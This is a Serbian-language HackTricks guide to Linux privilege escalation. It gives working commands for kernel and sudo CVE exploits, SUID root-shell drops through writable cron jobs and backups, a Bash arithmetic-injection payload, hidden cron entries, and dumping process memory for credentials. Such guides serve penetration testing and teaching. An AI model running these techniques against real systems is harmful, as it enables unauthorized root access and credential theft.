# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacije o sistemu

### OS info

Hajde da počnemo sa prikupljanjem informacija o OS-u koji radi
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Putanja

Ako **imate dozvole za upis u bilo koji folder unutar `PATH`** promenljive, možda ćete moći da hijack-ujete neke biblioteke ili binarne fajlove:
```bash
echo $PATH
```
### Informacije o okruženju

Zanimljive informacije, lozinke ili API ključevi u environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Proverite verziju kernela i da li postoji neki exploit koji se može iskoristiti za eskalaciju privilegija
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Možete pronaći dobru listu ranjivih kernel verzija i neke već **compiled exploits** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Druga mesta gde možete pronaći neke **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste izvukli sve ranjive kernel verzije sa tog web možete uraditi:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Alati koji mogu pomoći pri traženju kernel exploit-ova su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (pokreni NA žrtvi, proverava samo exploit-ove za kernel 2.x)

Uvek **pretraži verziju kernela na Google-u**, možda je tvoja verzija kernela navedena u nekom kernel exploit-u i tada ćeš biti siguran da je taj exploit validan.

Dodatne kernel exploitation tehnike:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo verzija

Na osnovu ranjivih sudo verzija koje se pojavljuju u:
```bash
searchsploit sudo
```
Možete proveriti da li je verzija sudo ranjiva koristeći ovaj grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo verzije pre 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) omogućavaju lokalnim korisnicima bez privilegija da eskaliraju privilegije do root preko sudo `--chroot` opcije kada se fajl `/etc/nsswitch.conf` koristi iz direktorijuma pod kontrolom korisnika.

Evo [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) za eksploataciju te [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Pre pokretanja exploita, uverite se da je vaša `sudo` verzija ranjiva i da podržava `chroot` feature.

Za više informacija, pogledajte originalni [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo pre 1.9.17p1 (prijavljeni opseg pogođenosti: **1.8.8–1.9.17**) može da evaluira host-based sudoers rules koristeći **hostname koji je uneo korisnik** iz `sudo -h <host>` umesto **stvarnog hostname-a**. Ako sudoers dodeljuje šire privilegije na drugom hostu, možete lokalno da **spoof**-ujete taj host.

Requirements:
- Ranjiva sudo verzija
- Host-specific sudoers rules (host nije ni trenutni hostname ni `ALL`)

Primer sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Eksploatiši tako što ćeš spoofovati dozvoljeni host:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Ako rezolucija spoofed imena blokira, dodajte ga u `/etc/hosts` ili koristite hostname koji se već pojavljuje u logovima/configs kako biste izbegli DNS lookups.

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Provera potpisa Dmesg nije uspela

Proverite **smasher2 box of HTB** za **primer** kako bi se ova ranjivost mogla iskoristiti
```bash
dmesg 2>/dev/null | grep "signature"
```
### Više sistemske enumeracije
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerisanje mogućih odbrana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Ako ste unutar kontejnera, počnite sa sledećim container-security odeljkom, a zatim pređite na runtime-specific abuse stranice:


{{#ref}}
container-security/
{{#endref}}

## Drives

Proverite **šta je mountovano i unmountovano**, gde i zašto. Ako je nešto unmountovano, možete pokušati da ga mountujete i proverite da li sadrži privatne informacije
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Koristan softver

Izlistajte korisne binarne fajlove
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Takođe, proveri da li je **neki compiler instaliran**. Ovo je korisno ako treba da koristiš neki kernel exploit, jer se preporučuje da ga kompajliraš na mašini na kojoj ćeš ga koristiti (ili na nekoj sličnoj)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Instaliran ranjiv softver

Proverite **verziju instaliranih paketa i servisa**. Možda postoji neka stara Nagios verzija (na primer) koja bi mogla da se iskoristi za eskalaciju privilegija…\
Preporučuje se da ručno proverite verziju sumnjivijeg instaliranog softvera.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ako imate SSH pristup mašini, možete takođe koristiti **openVAS** da proverite zastareli i ranjivi softver instaliran unutar mašine.

> [!NOTE] > _Imajte na umu da će ove komande prikazati mnogo informacija koje će uglavnom biti beskorisne, zato se preporučuje da koristite neke aplikacije poput OpenVAS ili slične koje će proveriti da li je bilo koja instalirana verzija softvera ranjiva na poznate exploit-e_

## Processes

Pogledajte **koji process-i** se izvršavaju i proverite da li neki process ima **više privilegija nego što bi trebalo** (možda tomcat koji se izvršava kao root?)
```bash
ps aux
ps -ef
top -n 1
```
Uvek proveri da li postoje [**electron/cef/chromium debuggers** pokrenuti, možeš to zloupotrebiti za eskalaciju privilegija](electron-cef-chromium-debugger-abuse.md). **Linpeas** ih detektuje proverom `--inspect` parametra unutar komandne linije procesa.\
Takođe **proveri svoje privilegije nad binarnim fajlovima procesa**, možda možeš da prepišeš nečiji.

### Cross-user parent-child chains

Child process koji radi pod **drugačijim korisnikom** od svog parent procesa nije automatski maliciozan, ali je koristan **triage signal**. Neki prelazi su očekivani (`root` pokreće service user, login managers kreiraju session procese), ali neobične chains mogu otkriti wrappers, debug helpers, persistence, ili slabe runtime trust boundaries.

Brzi pregled:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Ako pronađeš iznenađujući chain, proveri parent command line i sve fajlove koji utiču na njegovo ponašanje (`config`, `EnvironmentFile`, helper skripte, working directory, writable argumenti). U nekoliko stvarnih privesc putanja sam child nije bio writable, ali je **parent-controlled config** ili helper chain bio.

### Deleted executables and deleted-open files

Runtime artifacts su često i dalje dostupni **nakon brisanja**. Ovo je korisno i za privilege escalation i za oporavak dokaza iz procesa koji već ima otvorene sensitive fajlove.

Proveri deleted executables:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Ako `/proc/<PID>/exe` pokazuje na `(deleted)`, proces i dalje radi sa starom binarnom slikom iz memorije. To je jak signal za istragu zato što:

- uklonjeni izvršni fajl može sadržati zanimljive stringove ili kredencijale
- pokrenuti proces i dalje može otkrivati korisne file descriptors
- obrisani privilegovani binary može ukazivati na nedavnu manipulaciju ili pokušaj čišćenja

Prikupi globalno deleted-open fajlove:
```bash
lsof +L1
```
Ako pronađeš zanimljiv descriptor, oporavi ga direktno:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Ovo je posebno vredno kada proces i dalje ima otvoren obrisani secret, script, database export ili flag fajl.

### Process monitoring

Možete koristiti alate kao što je [**pspy**](https://github.com/DominicBreuker/pspy) za nadgledanje procesa. Ovo može biti veoma korisno za identifikovanje ranjivih procesa koji se često izvršavaju ili kada su ispunjeni određeni uslovi.

### Process memory

Neke usluge na serveru čuvaju **credentials u čistom tekstu unutar memorije**.\
Obično će vam biti potrebne **root privileges** da biste čitali memoriju procesa koji pripadaju drugim korisnicima, pa je ovo najčešće korisnije kada ste već root i želite da pronađete još credentials.\
Međutim, zapamtite da **kao običan korisnik možete čitati memoriju procesa koje vi posedujete**.

> [!WARNING]
> Imajte na umu da danas većina mašina **ne dozvoljava ptrace po default-u**, što znači da ne možete dumpovati druge procese koji pripadaju vašem neprivilegovanom korisniku.
>
> Fajl _**/proc/sys/kernel/yama/ptrace_scope**_ kontroliše dostupnost ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: svi procesi mogu biti debugovani, sve dok imaju isti uid. Ovo je klasičan način na koji je ptracing radio.
> - **kernel.yama.ptrace_scope = 1**: može se debugovati samo parent process.
> - **kernel.yama.ptrace_scope = 2**: samo admin može da koristi ptrace, jer je potrebna CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: nijedan proces ne može da se prati pomoću ptrace. Kada se jednom postavi, potreban je reboot da bi se ptracing ponovo omogućio.

#### GDB

Ako imate pristup memoriji FTP service-a (na primer), možete dobiti Heap i pretražiti njegove credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Za dati process ID, **maps pokazuje kako je memory mapiran unutar virtualnog address space-a tog procesa**; takođe prikazuje **permissions svake mapirane region**. **mem** pseudo file **otkriva samu memory procesa**. Iz **maps** file-a znamo koje su **memory regions readable** i njihove offsete. Ovu informaciju koristimo da **seek-ujemo kroz mem file i dump-ujemo sve readable regions** u fajl.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` omogućava pristup sistemskoj **fizičkoj** memoriji, a ne virtuelnoj memoriji. Kernelov virtuelni adresni prostor može se pristupiti pomoću /dev/kmem.\
Obično, `/dev/mem` je čitljiv samo za **root** i **kmem** grupu.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump za linux

ProcDump je Linux verzija klasičnog alata ProcDump iz Sysinternals suite alata za Windows. Preuzmite ga na [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Za dump procesa memory možete koristiti:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti root zahteve i dump-ovati proces koji posedujete
- Script A.5 iz [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is required)

### Credentials from Process Memory

#### Manual example

Ako utvrdite da je authenticator process pokrenut:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Možete dumpovati proces (pogledajte prethodne sekcije da pronađete različite načine za dumpovanje memorije procesa) i pretražiti kredencijale unutar memorije:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti kredencijale u čistom tekstu iz memorije** i iz nekih **dobro poznatih fajlova**. Za ispravan rad zahteva root privilegije.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Ako web “Crontab UI” panel (alseambusher/crontab-ui) radi kao root i vezan je samo za loopback, i dalje mu možeš pristupiti preko SSH local port-forwarding i kreirati privilegovani job za eskalaciju.

Tipičan lanac
- Otkrivanje porta dostupnog samo na loopbacku (npr. 127.0.0.1:8000) i Basic-Auth realm preko `ss -ntlp` / `curl -v localhost:8000`
- Pronalaženje kredencijala u operativnim artefaktima:
- Backup-i/scriptovi sa `zip -P <password>`
- systemd unit koji otkriva `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel i login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Napravi high-priv posao i pokreni ga odmah (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Koristi ga:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Ne pokreći Crontab UI kao root; ograniči ga namenskog korisnikom i minimalnim dozvolama
- Binduj na localhost i dodatno ograniči pristup preko firewall/VPN; nemoj ponovo koristiti lozinke
- Izbegavaj ugrađivanje tajni u unit fajlove; koristi secret store-ove ili root-only EnvironmentFile
- Omogući audit/logging za izvršavanje jobova na zahtev



Proveri da li je neki zakazani job ranjiv. Možda možeš da iskoristiš skriptu koju izvršava root (wildcard vuln? možeš li da modifikuješ fajlove koje root koristi? koristiš symlinks? kreiraš specifične fajlove u direktorijumu koji root koristi?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Ako se koristi `run-parts`, proveri koji će se nazivi zaista izvršiti:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Ovo izbegava lažne pozitivne rezultate. Upisivi periodični direktorijum je koristan samo ako se ime vašeg payload fajla poklapa sa lokalnim `run-parts` pravilima.

### Cron path

Na primer, unutar _/etc/crontab_ možete naći PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Primetite kako korisnik "user" ima prava pisanja nad /home/user_)

Ako unutar ovog crontab-a root korisnik pokuša da izvrši neku komandu ili skriptu bez podešavanja path-a. Na primer: _\* \* \* \* root overwrite.sh_\

Tada možete dobiti root shell koristeći:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Ako se skripta izvršava kao root i ima “**\***” unutar komande, to možete iskoristiti da izazovete neočekivane stvari (kao privesc). Primer:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ako je wildcard prethoden sa path-om kao** _**/some/path/\***_ **, nije ranjiv (čak ni** _**./\***_ **nije).**

Pročitaj sledeću stranicu za još wildcard exploitation trikova:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection u cron log parserima

Bash izvršava parameter expansion i command substitution pre arithmetic evaluation u ((...)), $((...)) i let. Ako root cron/parser čita nepouzdana log polja i prosleđuje ih u arithmetic context, napadač može da ubaci command substitution $(...) koja se izvršava kao root kada cron radi.

- Zašto radi: U Bash-u, expansions se dešavaju ovim redosledom: parameter/variable expansion, command substitution, arithmetic expansion, zatim word splitting i pathname expansion. Zato vrednost kao `$(/bin/bash -c 'id > /tmp/pwn')0` prvo bude zamenjena (izvršavajući komandu), a zatim se preostala numerička `0` koristi za arithmetic, pa skripta nastavlja bez grešaka.

- Tipičan ranjiv pattern:
```bash
#!/bin/bash
# Primer: parsira log i "sabira" count field koji dolazi iz log-a
while IFS=',' read -r ts user count rest; do
# count je nepouzdan ako je log pod kontrolom napadača
(( total += count ))     # ili: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Ubaci tekst pod kontrolom napadača u parsirani log tako da polje koje izgleda kao broj sadrži command substitution i završava se cifrom. Pobrinite se da vaša komanda ne ispisuje na stdout (ili ga redirektujte) tako da arithmetic ostane validan.
```bash
# Injected field value inside the log (npr. kroz crafted HTTP request koji app upisuje verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# Kada root cron parser evaluira (( total += count )), vaša komanda se izvršava kao root.
```

### Cron script overwriting i symlink

Ako **možeš da menjaš cron script** koji izvršava root, možeš veoma lako dobiti shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ako skripta koju izvršava root koristi **direktorijum kojem imaš potpuni pristup**, možda bi bilo korisno da obrišeš taj folder i **napraviš symlink folder ka nekom drugom** koji servira skriptu kojom ti upravljaš
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Validacija symlink-a i sigurnije rukovanje fajlovima

Kada pregledate privileged skripte/binare koji čitaju ili pišu fajlove po putanji, proverite kako se links obrađuju:

- `stat()` prati symlink i vraća metadata ciljane datoteke.
- `lstat()` vraća metadata samog linka.
- `readlink -f` i `namei -l` pomažu da se razreši konačni target i prikažu permissions svakog komponenta putanje.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Za branioce/developere, bezbedniji obrasci protiv symlink trikova uključuju:

- `O_EXCL` sa `O_CREAT`: fail ako putanja već postoji (blokira napadačeve unapred kreirane linkove/fajlove).
- `openat()`: radi relativno u odnosu na trusted directory file descriptor.
- `mkstemp()`: kreira privremene fajlove atomically sa secure permissions.

### Custom-signed cron binaries with writable payloads
Blue teams ponekad "sign" cron-driven binaries tako što dump-uju custom ELF section i grepuju vendor string pre nego što ih izvrše kao root. Ako je taj binary group-writable (npr. `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) i možete da leak-ujete signing material, možete forge-ovati section i hijack-ovati cron task:

1. Koristite `pspy` da uhvatite verification flow. U Era, root je pokrenuo `objcopy --dump-section .text_sig=text_sig_section.bin monitor` zatim `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` i potom izvršio fajl.
2. Rekreirajte očekivani certificate koristeći leak-ovani key/config (iz `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Izgradite malicious replacement (npr. drop SUID bash, dodajte svoj SSH key) i embed-ujte certificate u `.text_sig` tako da grep prođe:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Prepišite scheduled binary dok zadržavate execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Sačekajte sledeće pokretanje cron-a; čim naive signature check uspe, vaš payload se izvršava kao root.

### Frequent cron jobs

Možete nadgledati procese da biste pronašli procese koji se izvršavaju svakih 1, 2 ili 5 minuta. Možda možete da iskoristite to i eskalirate privileges.

Na primer, da biste **nadgledali na svakih 0.1s tokom 1 minute**, **sortirali po najmanje izvršavanim komandama** i obrisali komande koje su se najviše izvršavale, možete da uradite:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Možete takođe da koristite** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ovo će nadgledati i izlistati svaki proces koji se pokrene).

### Root backup-ovi koji čuvaju mode bits koje postavi napadač (pg_basebackup)

Ako root-owned cron umotava `pg_basebackup` (ili bilo koji recursive copy) nad direktorijumom baze podataka koji možete da pišete, možete postaviti **SUID/SGID binary** koji će biti ponovo kopiran kao **root:root** sa istim mode bits u backup izlaz.

Tipičan flow otkrivanja (kao low-priv DB user):
- Koristite `pspy` da primetite root cron koji poziva nešto poput `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` svake minute.
- Potvrdite da je source cluster (npr., `/var/lib/postgresql/14/main`) upisiv za vas i da destination (`/opt/backups/current`) postaje owned by root nakon job-a.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Ovo radi zato što `pg_basebackup` čuva bitove režima fajla prilikom kopiranja klastera; kada ga pokrene root, odredišni fajlovi nasleđuju **root ownership + attacker-chosen SUID/SGID**. Svaka slična privilegovana backup/copy rutina koja zadržava permissions i upisuje u executable lokaciju je ranjiva.

### Invisible cron jobs

Moguće je napraviti cronjob **stavljanjem carriage return posle komentara** (bez newline character), i cron job će raditi. Primer (obrati pažnju na carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Da biste otkrili ovu vrstu stealth ulaza, pregledajte cron fajlove alatima koji prikazuju kontrolne znakove:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Writable _.service_ files

Proveri da li možeš da pišeš u bilo koji `.service` fajl; ako možeš, **mogao bi da ga izmeniš** tako da **izvršava** tvoj **backdoor kada** se servis **pokrene**, **restartuje** ili **zaustavi** (možda ćeš morati da sačekaš dok se mašina ne rebootuje).\
Na primer, napravi svoj backdoor unutar .service fajla sa **`ExecStart=/tmp/script.sh`**

### Writable service binaries

Imaj na umu da, ako imaš **write permissions nad binarnim fajlovima koje izvršavaju servisi**, možeš da ih promeniš u backdoor-e tako da se, kada se servisi ponovo izvrše, i backdoor-i izvrše.

### systemd PATH - Relative Paths

Možeš da vidiš PATH koji koristi **systemd** pomoću:
```bash
systemctl show-environment
```
Ako otkriješ da možeš da **pišeš** u bilo kojoj od fascikli u putanji, možda ćeš moći da **eskaliraš privilegije**. Potrebno je da tražiš **relativne putanje koje se koriste u fajlovima sa konfiguracijom servisa** kao što su:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Zatim, napravite **izvršni fajl** sa **istim imenom kao binary relativne putanje** unutar systemd PATH foldera u koji možete da upisujete, i kada se od servisa zatraži da izvrši ranjivu akciju (**Start**, **Stop**, **Reload**), vaš **backdoor** će biti izvršen (neprivilegovani korisnici obično ne mogu da startuju/stopuju servise, ali proverite da li možete da koristite `sudo -l`).

**Saznajte više o servisima pomoću `man systemd.service`.**

## **Timers**

**Timers** su systemd unit fajlovi čije ime se završava na `**.timer**` i koji kontrolišu `**.service**` fajlove ili događaje. **Timers** se mogu koristiti kao alternativa za cron zato što imaju ugrađenu podršku za calendar time događaje i monotonic time događaje, i mogu se pokretati asinhrono.

Sve timere možete izlistati pomoću:
```bash
systemctl list-timers --all
```
### Zapisivi timers

Ako možeš da izmeniš timer, možeš ga naterati da izvrši neke postojeće systemd.unit (kao što su `.service` ili `.target`)
```bash
Unit=backdoor.service
```
U dokumentaciji možete pročitati šta je Unit:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Zato, da biste zloupotrebili ovu permisiju, morate da:

- Pronađete neki systemd unit (kao `.service`) koji **izvršava upisivi binary**
- Pronađete neki systemd unit koji **izvršava relativnu putanju** i imate **upisiva prava** nad **systemd PATH** (da biste se predstavili kao taj executable)

**Saznajte više o timers pomoću `man systemd.timer`.**

### **Enabling Timer**

Da biste omogućili timer, potrebni su vam root privilegije i da izvršite:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Napomena: **timer** se **aktivira** tako što se kreira symlink ka njemu na `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) omogućavaju **process communication** na istom ili različitim mašinama u okviru client-server modela. Koriste standardne Unix descriptor fajlove za inter-kompjutersku komunikaciju i podešavaju se preko `.socket` fajlova.

Sockets se mogu konfigurisati pomoću `.socket` fajlova.

**Saznaj više o sockets uz `man systemd.socket`.** Unutar ovog fajla može da se konfiguriše nekoliko zanimljivih parametara:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ove opcije su različite, ali sažetak se koristi da **prikaže gde će slušati** socket (putanju AF_UNIX socket fajla, IPv4/6 i/ili broj porta na kojem će slušati, itd.)
